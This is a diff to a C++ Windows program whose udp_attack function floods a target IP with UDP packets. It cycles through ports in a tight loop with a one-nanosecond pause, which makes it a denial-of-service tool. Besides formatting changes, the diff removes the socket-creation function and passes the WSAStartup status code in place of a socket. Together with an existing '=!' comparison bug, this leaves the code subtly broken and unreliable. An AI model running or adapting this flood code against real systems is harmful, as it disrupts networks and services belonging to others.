@@ -12,7 +12,7 @@
 /**Creates a startup socket
  *@return WinSock
  */
-auto create_winsocket() {
+auto create_winsocket(){
     WSAData wsa;    /** Structure that contains information about the Windows Sockets implementation **/
     auto WinSock = WSAStartup(WINSOCK_VERSION, &wsa); /** WSAStartup function initiates use of the Winsock DLL by a process. **/
     if (WinSock =! 0) {     /** checking if socket works **/
@@ -23,30 +23,12 @@ auto create_winsocket() {
     }
     return WinSock;
 }
-/** creates a socket
- *
- *
- * @return socket
- */
-auto create_socket() {
-    auto sock = socket(AF_INET, SOCK_DGRAM, 0); /** Initializes a socket **/
-    if (sock == INVALID_SOCKET) {   /** Checking if socket works **/
-        std::cout << "socket creation failed...\n";
-        exit(0);
-    }
-    else {
-        std::cout << "Socket successfully created..\n";
-    }
-    return sock;
-}
-
 /**
  *
  * @param ipAddress
  * @return If string is a valid ip address
  */
-bool isIPv4(std::string s)
-{
+bool isIPv4(std::string s){
     int cnt = 0; /** Store the count of occurrence of '.' in the given string **/
     for (int i = 0; i < s.size(); i++) { /** Traverse the string s **/
         if (s[i] == '.')
@@ -96,18 +78,17 @@ bool isIPv4(std::string s)
     return true;
 }
 
-
 /**
  * Starts the UDP attack
  * @param IP
  * @return sent packet
   **/
- auto udp_attack(std::string IP) {
+auto udp_attack(std::string IP){
     SOCKADDR_IN ad{ AF_INET };
     InetPtonA(AF_INET, IP.c_str(), &ad.sin_addr);
 
     std::array<int32_t, 1024> buffer; /** Multi purpose array **/
-    auto s = create_socket(); /** calls previously created function **/
+    auto s = create_winsocket(); /** calls previously created function **/
 
     int i = 0;
 
@@ -119,10 +100,13 @@ bool isIPv4(std::string s)
         std::generate(buffer.begin(), buffer.end(), [&]() -> int32_t {
             ad.sin_port++; /** increments port number by one **/
             return sendto(s, reinterpret_cast<const char*>(buffer.data()), sizeof(buffer), 0, reinterpret_cast<const sockaddr*>(&ad), sizeof(ad));});
-            /** sends packet **/
+        /** sends packet **/
         const size_t packets = std::count_if(buffer.cbegin(), buffer.cend(), std::bind(std::not_equal_to<>{}, _1, SOCKET_ERROR));
         std::cout << "Sent " << packets << " to host" << '\n';
         std::this_thread::sleep_for(std::chrono::nanoseconds(1)); /** stops for one nanosecond**/
     }
 }
+
+
+
 
